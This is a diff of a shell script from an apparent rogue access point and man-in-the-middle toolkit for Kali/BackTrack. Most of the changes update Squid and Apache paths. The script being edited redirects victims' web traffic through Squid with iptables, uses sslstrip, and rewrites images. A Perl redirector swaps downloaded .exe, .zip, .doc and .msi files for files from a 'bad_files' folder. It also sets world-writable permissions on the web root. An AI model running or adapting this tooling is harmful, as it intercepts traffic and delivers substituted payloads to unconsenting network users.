 # /usr/lib/cgi-bin/cachemgr.cgi
-# cp /usr/lib/cgi-bin/cachemgr.cgi /var/www/cgi-bin/
-# $browser http://127.0.0.1/cgi-bin/cachemgr.cgi &
+# cp /usr/lib/cgi-bin/cachemgr.cgi /var/www/html/cgi-bin/
+# xdg-open http://127.0.0.1/cgi-bin/cachemgr.cgi &
 
 # Let's write our storeurl script
 # The script will effect: .google.com .google.de .tiles.virtualearth.net map.org .tile.cloudmade.com dstdomain 
@@ -6079,7 +6114,7 @@ if [ "$WLNMODE" = "Proxied" ];then
 #
 #http://code.google.com/p/ghebhes/downloads/list
 
-cat > /etc/squid3/url_rewrite << "EOF"
+cat > /etc/squid/url_rewrite << "EOF"
 #!/usr/bin/env perl
 ## @author Robin Schneider <ypid23@aol.de>
 ## @licence GPLv3 <http://www.gnu.org/licenses/gpl.html>
@@ -6147,12 +6182,12 @@ while (<>) {
 EOF
 
 # Make it executable
-chmod 755 /etc/squid3/url_rewrite
+chmod 755 /etc/squid/url_rewrite
 
 
 # Let's create a new optimized for Speed and Performance squid3.conf.
 
-cat > /etc/squid3/squid.conf <<EOF
+cat > /etc/squid/squid.conf <<EOF
 # Access Controls
 acl manager proto cache_object
 acl localhost src 127.0.0.1/32
@@ -6209,7 +6244,7 @@ cache_log /var/log/squid3/cache.log
 cache_store_log /var/log/squid3/store.log
 
 #url rewrite script
-url_rewrite_program /etc/squid3/url_rewrite
+url_rewrite_program /etc/squid/url_rewrite
 redirect_children $rdr_chil startup=$rdr_chil_strup idle=$rdr_chil_idle concurrency=$rdr_chil_conc
 #url_rewrite_children $rdr_chil startup=$rdr_chil_strup idle=$rdr_chil_idle concurrency=$rdr_chil_conc
 
@@ -6326,46 +6361,46 @@ EOF
 # TODO: Test with BT5R3
 if [ "$OS" = "KALI_linux" ];then
 	if [ "$Squid_ver" = "3.3.8" ];then
-		sed 's%acl manager proto cache_object%#acl manager proto cache_object%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-		sed 's%acl localhost src 127.0.0.1/32%#acl localhost src 127.0.0.1/32%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-		sed 's%#http_port 3127%http_port 3127%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-		sed 's%access_log /var/log/squid3/access.log squid%#access_log /var/log/squid3/access.log squid%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-		sed 's%#access_log stdio:/var/log/squid3/access.log squid%access_log stdio:/var/log/squid3/access.log squid%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-		sed 's%log_fqdn off%#log_fqdn off%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
+		sed 's%acl manager proto cache_object%#acl manager proto cache_object%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+		sed 's%acl localhost src 127.0.0.1/32%#acl localhost src 127.0.0.1/32%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+		sed 's%#http_port 3127%http_port 3127%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+		sed 's%access_log /var/log/squid3/access.log squid%#access_log /var/log/squid3/access.log squid%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+		sed 's%#access_log stdio:/var/log/squid3/access.log squid%access_log stdio:/var/log/squid3/access.log squid%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+		sed 's%log_fqdn off%#log_fqdn off%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
 	elif [ "$Squid_ver" = "3.1.20" ];then
 		#echo "Kali Squid3 version 3.1.20"
-		sed 's%storeurl_rewrite_children %redirect_children %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
+		sed 's%storeurl_rewrite_children %redirect_children %g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
 	fi
 elif [ "$OS" = "BackTrack_5R3" ];then
 	if [ "$Squid_ver" = "3.3.8" ];then
-		sed 's%acl manager proto cache_object%#acl manager proto cache_object%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-		sed 's%acl localhost src 127.0.0.1/32%#acl localhost src 127.0.0.1/32%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-		sed 's%#http_port 3127%http_port 3127%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-		sed 's%access_log /var/log/squid3/access.log squid%#access_log /var/log/squid3/access.log squid%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-		sed 's%#access_log stdio:/var/log/squid3/access.log squid%access_log stdio:/var/log/squid3/access.log squid%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-		sed 's%log_fqdn off%#log_fqdn off%g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
+		sed 's%acl manager proto cache_object%#acl manager proto cache_object%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+		sed 's%acl localhost src 127.0.0.1/32%#acl localhost src 127.0.0.1/32%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+		sed 's%#http_port 3127%http_port 3127%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+		sed 's%access_log /var/log/squid3/access.log squid%#access_log /var/log/squid3/access.log squid%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+		sed 's%#access_log stdio:/var/log/squid3/access.log squid%access_log stdio:/var/log/squid3/access.log squid%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+		sed 's%log_fqdn off%#log_fqdn off%g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
 	elif [ "$Squid_ver" = "3.1.20" ];then
 		#echo "BT5 Squid3 version 3.1.20"
-		sed 's%storeurl_rewrite_children %redirect_children %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
+		sed 's%storeurl_rewrite_children %redirect_children %g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
 	fi
 fi
 
 if [ -n "`pidof squid3`" ];then
 	squid3 -k reconfigure
-	$cecho "[ "$GREEN"ok"$END" ] Squid3 conf file: /etc/squid3/squid.conf"
-	$cecho "[ "$GREEN"ok"$END" ] Squid3 storeURL script: /etc/squid3/url_rewrite"
+	$cecho "[ "$GREEN"ok"$END" ] Squid3 conf file: /etc/squid/squid.conf"
+	$cecho "[ "$GREEN"ok"$END" ] Squid3 storeURL script: /etc/squid/url_rewrite"
 else
-	/etc/init.d/squid3 restart
-	$cecho "[ "$GREEN"ok"$END" ] Squid HTTP Proxy 3.x conf file: /etc/squid3/squid.conf"
-	$cecho "[ "$GREEN"ok"$END" ] Squid3 storeURL script: /etc/squid3/url_rewrite"
+	/etc/init.d/squid restart
+	$cecho "[ "$GREEN"ok"$END" ] Squid HTTP Proxy 3.x conf file: /etc/squid/squid.conf"
+	$cecho "[ "$GREEN"ok"$END" ] Squid3 storeURL script: /etc/squid/url_rewrite"
 fi
 
-# Make dir /sarg-realtime in /var/www/ Copy sarg-realtime.php to /var/www/sarg-realtime/ 
-if [  ! -d /var/www/sarg-realtime  ];then
-	mkdir /var/www/sarg-realtime
-	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/sarg-realtime/ 
-	chown -R www-data:www-data /var/www
-	chmod -R 1777 /var/www
+# Make dir /sarg-realtime in /var/www/html/ Copy sarg-realtime.php to /var/www/html/sarg-realtime/ 
+if [  ! -d /var/www/html/sarg-realtime  ];then
+	mkdir /var/www/html/sarg-realtime
+	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/html/sarg-realtime/ 
+	chown -R www-data:www-data /var/www/html
+	chmod -R 1777 /var/www/html
 	usermod -aG proxy www-data
 fi
 
@@ -6389,7 +6424,7 @@ $cecho "[ "$GREEN"ok"$END" ] Apache2 conf file: /etc/apache2/apache2.conf"
 sleep 3
 $necho "[....] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
 sarg -r > /dev/null &
-$browser http://127.0.0.1/sarg-realtime/sarg-realtime.php &
+xdg-open http://127.0.0.1/sarg-realtime/sarg-realtime.php &
 $cecho "\r[ "$GREEN"ok"$END" ] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
 
 echo
@@ -6416,27 +6451,27 @@ fi
 if [ "$WLNMODE" = "Air_chat" ];then
 
 # See if Air-chat is installed, If not, install it.
-if [ ! -d /var/www/ajaxscript ] || [ ! -d /var/www/aw_tpl ] || [ ! -d /var/www/black_tpl ] || [ ! -d /var/www/smilies ] || [ ! -f /var/www/admin.php ] || [ ! -f /var/www/anmeldung.php ] || [ ! -f /var/www/bad_words.txt ] || [ ! -f /var/www/chat.csv ] || [ ! -f /var/www/config.php ] || [ ! -f /var/www/filtering.inc.php ] || [ ! -f /var/www/gesperrt.csv ] || [ ! -f /var/www/incert.php ] || [ ! -f /var/www/index.php ] || [ ! -f /var/www/lesen.php ] || [ ! -f /var/www/online.csv ] || [ ! -f /var/www/online.php ] || [ ! -f /var/www/onlinereloader.php ] || [ ! -f /var/www/plugins.inc.php ] || [ ! -f /var/www/reloader.php ] || [ ! -f /var/www/schreiben.php ] || [ ! -f /var/www/tpl.inc.php ];then
+if [ ! -d /var/www/html/ajaxscript ] || [ ! -d /var/www/html/aw_tpl ] || [ ! -d /var/www/html/black_tpl ] || [ ! -d /var/www/html/smilies ] || [ ! -f /var/www/html/admin.php ] || [ ! -f /var/www/html/anmeldung.php ] || [ ! -f /var/www/html/bad_words.txt ] || [ ! -f /var/www/html/chat.csv ] || [ ! -f /var/www/html/config.php ] || [ ! -f /var/www/html/filtering.inc.php ] || [ ! -f /var/www/html/gesperrt.csv ] || [ ! -f /var/www/html/incert.php ] || [ ! -f /var/www/html/index.php ] || [ ! -f /var/www/html/lesen.php ] || [ ! -f /var/www/html/online.csv ] || [ ! -f /var/www/html/online.php ] || [ ! -f /var/www/html/onlinereloader.php ] || [ ! -f /var/www/html/plugins.inc.php ] || [ ! -f /var/www/html/reloader.php ] || [ ! -f /var/www/html/schreiben.php ] || [ ! -f /var/www/html/tpl.inc.php ];then
 	if [ -f $DEPEND_DIR/dependencies/airchat_2.1a/airchat.tar.bz2 ];then
 		tar xjf $DEPEND_DIR/dependencies/airchat_2.1a/airchat.tar.bz2 -C /var/
-		chmod 777 /var/www/*.csv
+		chmod 777 /var/www/html/*.csv
 	fi
 else
 	# Clean up. New session
-cat > /var/www/chat.csv << EOF
+cat > /var/www/html/chat.csv << EOF
 #
 EOF
-	cat /dev/null > /var/www/gesperrt.csv
-	cat /dev/null > /var/www/online.csv
-	chmod 777 /var/www/*.csv
+	cat /dev/null > /var/www/html/gesperrt.csv
+	cat /dev/null > /var/www/html/online.csv
+	chmod 777 /var/www/html/*.csv
 fi
 
 # Start apache2 so it can serve Air Chat to our clients.
 /etc/init.d/apache2 start
 
-$necho "[....] Starting Air chat.(/var/www/)"
-$browser localhost > /dev/null &
-$cecho "\r[ "$GREEN"ok"$END" ] Starting Air chat.(/var/www/)"
+$necho "[....] Starting Air chat.(/var/www/html/)"
+xdg-open localhost > /dev/null &
+$cecho "\r[ "$GREEN"ok"$END" ] Starting Air chat.(/var/www/html/)"
 
 iptables --flush
 iptables --table nat --flush
@@ -6676,17 +6711,17 @@ if [ -f $HOME_DIR/sslstrip/output-ssl.log ];then
 	chown root:root $HOME_DIR/sslstrip/output-ssl.log
 fi
 
-# Make dir /sarg-realtime in /var/www/ Copy sarg-realtime.php to /var/www/sarg-realtime/ 
-if [  ! -d /var/www/sarg-realtime  ];then
-	mkdir /var/www/sarg-realtime
-	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/sarg-realtime/ 
-	chown -R www-data:www-data /var/www
-	chmod -R 1777 /var/www
+# Make dir /sarg-realtime in /var/www/html/ Copy sarg-realtime.php to /var/www/html/sarg-realtime/ 
+if [  ! -d /var/www/html/sarg-realtime  ];then
+	mkdir /var/www/html/sarg-realtime
+	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/html/sarg-realtime/ 
+	chown -R www-data:www-data /var/www/html
+	chmod -R 1777 /var/www/html
 	usermod -aG proxy www-data
 fi
 
 # Let's start Squid3
-/etc/init.d/squid3 restart
+/etc/init.d/squid restart
 
 iptables --flush
 iptables --table nat --flush
@@ -6715,7 +6750,7 @@ $cecho "[ "$GREEN"ok"$END" ] Proxychains conf file: /etc/proxychains.conf"
 sleep 3
 $necho "[....] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
 sarg -r > /dev/null &
-$browser http://127.0.0.1/sarg-realtime/sarg-realtime.php &
+xdg-open http://127.0.0.1/sarg-realtime/sarg-realtime.php &
 $cecho "\r[ "$GREEN"ok"$END" ] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
 
 echo
@@ -6755,7 +6790,7 @@ use POSIX strftime;
 
 $debug = 0;                      	# Debug mode - create log file
 $ourIP = "127.0.0.1"; 			# Our IP address
-$baseDir = "/var/www/images";       	# Needs be writable by 'nobody'
+$baseDir = "/var/www/html/images";       	# Needs be writable by 'nobody'
 $baseURL = "http://".$ourIP."/images";	# Location on websever
 $mogrify = "/usr/bin/mogrify";     	# Path to mogrify
 
@@ -6820,23 +6855,23 @@ fi
 # Make it executable
 chmod 755 /usr/local/bin/redirect.pl
 
-# Make dir /images/ in /var/www/ and if exist erase it's contents
-if [ ! -d /var/www/images ];then
-	mkdir /var/www/images
-	chown -R www-data:www-data /var/www
-	chmod -R 1777 /var/www
+# Make dir /images/ in /var/www/html/ and if exist erase it's contents
+if [ ! -d /var/www/html/images ];then
+	mkdir /var/www/html/images
+	chown -R www-data:www-data /var/www/html
+	chmod -R 1777 /var/www/html
 	usermod -aG proxy www-data
-	#chown nobody /var/www/images
+	#chown nobody /var/www/html/images
 else
-	rm -r -f /var/www/images/*
+	rm -r -f /var/www/html/images/*
 fi
 
-# Make dir /sarg-realtime in /var/www/ Copy sarg-realtime.php to /var/www/sarg-realtime/ 
-if [  ! -d /var/www/sarg-realtime  ];then
-	mkdir /var/www/sarg-realtime
-	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/sarg-realtime/ 
-	chown -R www-data:www-data /var/www
-	chmod -R 1777 /var/www
+# Make dir /sarg-realtime in /var/www/html/ Copy sarg-realtime.php to /var/www/html/sarg-realtime/ 
+if [  ! -d /var/www/html/sarg-realtime  ];then
+	mkdir /var/www/html/sarg-realtime
+	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/html/sarg-realtime/ 
+	chown -R www-data:www-data /var/www/html
+	chmod -R 1777 /var/www/html
 	usermod -aG proxy www-data
 fi
 
@@ -6844,8 +6879,8 @@ fi
 # url_rewrite_program /usr/local/bin/redirect.pl
 # redirect_children 
 # Remove "#"
-sed 's%#url_rewrite_program %url_rewrite_program %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-sed 's%#redirect_children %redirect_children %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
+sed 's%#url_rewrite_program %url_rewrite_program %g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+sed 's%#redirect_children %redirect_children %g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
 
 # Start apache2 so it can serve real time reports from SARG to our localhost.
 /etc/init.d/apache2 start
@@ -6853,11 +6888,11 @@ $cecho "[ "$GREEN"ok"$END" ] Apache2 conf file: /etc/apache2/apache2.conf"
 
 if [ -n "`pidof squid3`" ];then
 	squid3 -k reconfigure
-	$cecho "[ "$GREEN"ok"$END" ] Squid3 conf file: /etc/squid3/squid.conf"
+	$cecho "[ "$GREEN"ok"$END" ] Squid3 conf file: /etc/squid/squid.conf"
 	$cecho "[ "$GREEN"ok"$END" ] Squid3 redirect script: /usr/local/bin/redirect.pl"
 else
-	/etc/init.d/squid3 restart
-	$cecho "[ "$GREEN"ok"$END" ] Squid HTTP Proxy 3.x conf file: /etc/squid3/squid.conf"
+	/etc/init.d/squid restart
+	$cecho "[ "$GREEN"ok"$END" ] Squid HTTP Proxy 3.x conf file: /etc/squid/squid.conf"
 	$cecho "[ "$GREEN"ok"$END" ] Squid3 redirect script: /usr/local/bin/redirect.pl"
 fi
 
@@ -6877,7 +6912,7 @@ iptables -t nat -A PREROUTING -i $IFACE -p tcp -m tcp --dport 80 -j REDIRECT --t
 sleep 3
 $necho "[....] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
 sarg -r > /dev/null &
-$browser http://127.0.0.1/sarg-realtime/sarg-realtime.php &
+xdg-open http://127.0.0.1/sarg-realtime/sarg-realtime.php &
 $cecho "\r[ "$GREEN"ok"$END" ] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
 
 echo
@@ -6922,7 +6957,7 @@ use POSIX strftime;
 
 $debug = 0;                             # Debug mode - create log file
 $ourIP = "127.0.0.1";                   # Our IP address
-$baseDir = "/var/www/images";           # Needs be writable by 'nobody'
+$baseDir = "/var/www/html/images";           # Needs be writable by 'nobody'
 $baseURL = "http://".$ourIP."/images";  # Location on websever
 $convert = "/usr/bin/convert";          # Path to convert
 $identify = "/usr/bin/identify";        # Path to identify
@@ -6993,23 +7028,23 @@ EOF
 # Make it executable
 chmod 755 /usr/local/bin/redirect.pl
 
-# Make dir /images/ in /var/www/ and if exist erase it's contents
-if [ ! -d /var/www/images ];then
-	mkdir /var/www/images
-	chown -R www-data:www-data /var/www
-	chmod -R 1777 /var/www
+# Make dir /images/ in /var/www/html/ and if exist erase it's contents
+if [ ! -d /var/www/html/images ];then
+	mkdir /var/www/html/images
+	chown -R www-data:www-data /var/www/html
+	chmod -R 1777 /var/www/html
 	usermod -aG proxy www-data
 else
-	rm -r -f /var/www/images/*
+	rm -r -f /var/www/html/images/*
 fi
 
 
-# Make dir /sarg-realtime in /var/www/ Copy sarg-realtime.php to /var/www/sarg-realtime/ 
-if [  ! -d /var/www/sarg-realtime  ];then
-	mkdir /var/www/sarg-realtime
-	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/sarg-realtime/ 
-	chown -R www-data:www-data /var/www
-	chmod -R 1777 /var/www
+# Make dir /sarg-realtime in /var/www/html/ Copy sarg-realtime.php to /var/www/html/sarg-realtime/ 
+if [  ! -d /var/www/html/sarg-realtime  ];then
+	mkdir /var/www/html/sarg-realtime
+	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/html/sarg-realtime/ 
+	chown -R www-data:www-data /var/www/html
+	chmod -R 1777 /var/www/html
 	usermod -aG proxy www-data
 fi
 
@@ -7017,8 +7052,8 @@ fi
 # url_rewrite_program /usr/local/bin/redirect.pl
 # redirect_children 
 # Remove "#"
-sed 's%#url_rewrite_program %url_rewrite_program %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-sed 's%#redirect_children %redirect_children %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
+sed 's%#url_rewrite_program %url_rewrite_program %g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+sed 's%#redirect_children %redirect_children %g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
 
 # Start apache2 so it can serve real time reports from SARG to our localhost.
 /etc/init.d/apache2 start
@@ -7026,11 +7061,11 @@ $cecho "[ "$GREEN"ok"$END" ] Apache2 conf file: /etc/apache2/apache2.conf"
 
 if [ -n "`pidof squid3`" ];then
 	squid3 -k reconfigure
-	$cecho "[ "$GREEN"ok"$END" ] Squid3 conf file: /etc/squid3/squid.conf"
+	$cecho "[ "$GREEN"ok"$END" ] Squid3 conf file: /etc/squid/squid.conf"
 	$cecho "[ "$GREEN"ok"$END" ] Squid3 redirect script: /usr/local/bin/redirect.pl"
 else
-	/etc/init.d/squid3 restart
-	$cecho "[ "$GREEN"ok"$END" ] Squid HTTP Proxy 3.x conf file: /etc/squid3/squid.conf"
+	/etc/init.d/squid restart
+	$cecho "[ "$GREEN"ok"$END" ] Squid HTTP Proxy 3.x conf file: /etc/squid/squid.conf"
 	$cecho "[ "$GREEN"ok"$END" ] Squid3 redirect script: /usr/local/bin/redirect.pl"
 fi
 
@@ -7050,7 +7085,7 @@ iptables -t nat -A PREROUTING -i $IFACE -p tcp -m tcp --dport 80 -j REDIRECT --t
 sleep 3
 $necho "[....] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
 sarg -r > /dev/null &
-$browser http://127.0.0.1/sarg-realtime/sarg-realtime.php &
+xdg-open http://127.0.0.1/sarg-realtime/sarg-realtime.php &
 $cecho "\r[ "$GREEN"ok"$END" ] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
 
 echo
@@ -7088,7 +7123,7 @@ use POSIX strftime;
 $debug = 0;                               # Debug mode - create log file
 @words = ('Kali','Linux','$friendly_name','Nick_the_Greek','Kali Linux','prank-o-matic','g0tmi1k');   # Use theses words at random...
 $ourIP = "127.0.0.1";                     # Our IP address
-$baseDir = "/var/www/images";             # Needs be writable by 'nobody'
+$baseDir = "/var/www/html/images";             # Needs be writable by 'nobody'
 $baseURL = "http://".$ourIP."/images";    # Location on websever
 $convert = "/usr/bin/convert";            # Path to convert
 $identify = "/usr/bin/identify";          # Path to identify
@@ -7161,29 +7196,29 @@ EOF
 # Make it executable
 chmod 755 /usr/local/bin/redirect.pl
 
-# Make dir /images/ in /var/www/ and if exist erase it's contents
-if [ ! -d /var/www/images ];then
-	mkdir /var/www/images
-	chown -R www-data:www-data /var/www
-	chmod -R 1777 /var/www
+# Make dir /images/ in /var/www/html/ and if exist erase it's contents
+if [ ! -d /var/www/html/images ];then
+	mkdir /var/www/html/images
+	chown -R www-data:www-data /var/www/html
+	chmod -R 1777 /var/www/html
 	usermod -aG proxy www-data;else
-	rm -r -f /var/www/images/*
+	rm -r -f /var/www/html/images/*
 fi
 
-# Make dir /sarg-realtime in /var/www/ Copy sarg-realtime.php to /var/www/sarg-realtime/ 
-if [  ! -d /var/www/sarg-realtime  ];then
-	mkdir /var/www/sarg-realtime
-	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/sarg-realtime/ 
-	chown -R www-data:www-data /var/www
-	chmod -R 1777 /var/www
+# Make dir /sarg-realtime in /var/www/html/ Copy sarg-realtime.php to /var/www/html/sarg-realtime/ 
+if [  ! -d /var/www/html/sarg-realtime  ];then
+	mkdir /var/www/html/sarg-realtime
+	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/html/sarg-realtime/ 
+	chown -R www-data:www-data /var/www/html
+	chmod -R 1777 /var/www/html
 	usermod -aG proxy www-data
 fi
 
 # Activate our redirect script in squid3.conf
 # url_rewrite_program /usr/local/bin/redirect.pl
 # redirect_children 
-sed 's%#url_rewrite_program %url_rewrite_program %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
-sed 's%#redirect_children %redirect_children %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
+sed 's%#url_rewrite_program %url_rewrite_program %g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
+sed 's%#redirect_children %redirect_children %g' /etc/squid/squid.conf > /etc/squid/squid1.conf && mv /etc/squid/squid1.conf /etc/squid/squid.conf
 
 # Start apache2 so it can serve real time reports from SARG to our localhost.
 /etc/init.d/apache2 start
@@ -7191,11 +7226,11 @@ $cecho "[ "$GREEN"ok"$END" ] Apache2 conf file: /etc/apache2/apache2.conf"
 
 if [ -n "`pidof squid3`" ];then
 	squid3 -k reconfigure
-	$cecho "[ "$GREEN"ok"$END" ] Squid3 conf file: /etc/squid3/squid.conf"
+	$cecho "[ "$GREEN"ok"$END" ] Squid3 conf file: /etc/squid/squid.conf"
 	$cecho "[ "$GREEN"ok"$END" ] Squid3 redirect script: /usr/local/bin/redirect.pl"
 else
-	/etc/init.d/squid3 restart
-	$cecho "[ "$GREEN"ok"$END" ] Squid HTTP Proxy 3.x conf file: /etc/squid3/squid.conf"
+	/etc/init.d/squid restart
+	$cecho "[ "$GREEN"ok"$END" ] Squid HTTP Proxy 3.x conf file: /etc/squid/squid.conf"
 	$cecho "[ "$GREEN"ok"$END" ] Squid3 redirect script: /usr/local/bin/redirect.pl"
 fi
 
@@ -7216,7 +7251,7 @@ iptables -t nat -A PREROUTING -i $IFACE -p tcp -m tcp --dport 80 -j REDIRECT --t
 sleep 3
 $necho "[....] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
 sarg -r > /dev/null &
-$browser http://127.0.0.1/sarg-realtime/sarg-realtime.php &
+xdg-open http://127.0.0.1/sarg-realtime/sarg-realtime.php &
 $cecho "\r[ "$GREEN"ok"$END" ] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
 
 echo
@@ -7261,30 +7296,30 @@ while (<>) {
         chomp $_;
         if ($_ =~ /(.*\.exe)/i) {
                 $url = $1;
-                system("/bin/cp", "$HOME_DIR/bad_files/test.exe","/var/www/files/$pid-$count.exe");
+                system("/bin/cp", "$HOME_DIR/bad_files/test.exe","/var/www/html/files/$pid-$count.exe");
                 print "http://127.0.0.1/files/$pid-$count.exe\n";
         }
         elsif ($_ =~ /(.*\.rar)/i) {
                 $url = $1;
-                system("/bin/cp", "$HOME_DIR/bad_files/test.rar","/var/www/files/$pid-$count.rar");
+                system("/bin/cp", "$HOME_DIR/bad_files/test.rar","/var/www/html/files/$pid-$count.rar");
                 print "http://127.0.0.1/files/$pid-$count.rar\n";
 
         }
         elsif ($_ =~ /(.*\.zip)/i) {
                 $url = $1;
-                system("/bin/cp", "$HOME_DIR/bad_files/test.zip","/var/www/files/$pid-$count.zip");
+                system("/bin/cp", "$HOME_DIR/bad_files/test.zip","/var/www/html/files/$pid-$count.zip");
                 print "http://127.0.0.1/files/$pid-$count.zip\n";
 
         }
         elsif ($_ =~ /(.*\.doc)/i) {
                 $url = $1;
-                system("/bin/cp", "$HOME_DIR/bad_files/test.doc","/var/www/files/$pid-$count.doc");
+                system("/bin/cp", "$HOME_DIR/bad_files/test.doc","/var/www/html/files/$pid-$count.doc");
                 print "http://127.0.0.1/files/$pid-$count.doc\n";
 
         }
 	elsif ($_ =~ /(.*\.msi)/i) {
                 $url = $1;
-                system("/bin/cp", "$HOME_DIR/bad_files/test.msi","/var/www/files/$pid-$count.msi");
+                system("/bin/cp", "$HOME_DIR/bad_files/test.msi","/var/www/html/files/$pid-$count.msi");
                 print "http://127.0.0.1/files/$pid-$count.msi\n";
         }
         else {
@@ -7296,38 +7331,38 @@ EOF
 
 #Replace $HOME_DIR with "$HOME_DIR" :-)
 # See above cat.... "EOF"
-sed 's%system("/bin/cp", "$HOME_DIR/bad_files/test.exe","/var/www/files/$pid-$count.exe");%system("/bin/cp", "'$HOME_DIR'/bad_files/test.exe","/var/www/files/$pid-$count.exe");%g' /usr/local/bin/redirect.pl > /usr/local/bin/redirect1.pl && mv /usr/local/bin/redirect1.pl /usr/local/bin/redirect.pl
-sed 's%system("/bin/cp", "$HOME_DIR/bad_files/test.rar","/var/www/files/$pid-$count.rar");%system("/bin/cp", "'$HOME_DIR'/bad_files/test.rar","/var/www/files/$pid-$count.rar");%g' /usr/local/bin/redirect.pl > /usr/local/bin/redirect1.pl && mv /usr/local/bin/redirect1.pl /usr/local/bin/redirect.pl
-sed 's%system("/bin/cp", "$HOME_DIR/bad_files/test.zip","/var/www/files/$pid-$count.zip");%system("/bin/cp", "'$HOME_DIR'/bad_files/test.zip","/var/www/files/$pid-$count.zip");%g' /usr/local/bin/redirect.pl > /usr/local/bin/redirect1.pl && mv /usr/local/bin/redirect1.pl /usr/local/bin/redirect.pl
